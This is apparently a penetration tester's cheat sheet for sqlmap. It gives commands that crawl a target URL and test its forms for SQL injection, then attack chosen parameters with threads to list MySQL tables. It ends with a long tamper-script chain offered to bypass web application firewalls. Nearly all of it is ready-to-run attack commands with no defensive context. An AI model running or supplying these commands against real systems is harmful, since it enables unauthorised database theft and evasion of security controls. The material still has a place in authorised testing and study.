# Crawl, parse and test forms on target URL
```sh
sqlmap -u <url> --forms --crawl=2
```

# Attack specific parameters
```sh
sqlmap -u <url> --dbms=mysql --tables --threads 5 --data "<with_post>" -p "<parameter>"
```

# Notes
* buypass WAF with `--tamper=apostrophemask,apostrophenullencode,base64encode,between,chardoubleencode,charencode,charunicodeencode,equaltolike,greatest,ifnull2ifisnull,multiplespaces,nonrecursivereplacement,percentage,randomcase,securesphere,space2comment,space2plus,space2randomblank,unionalltounion,unmagicquotes`
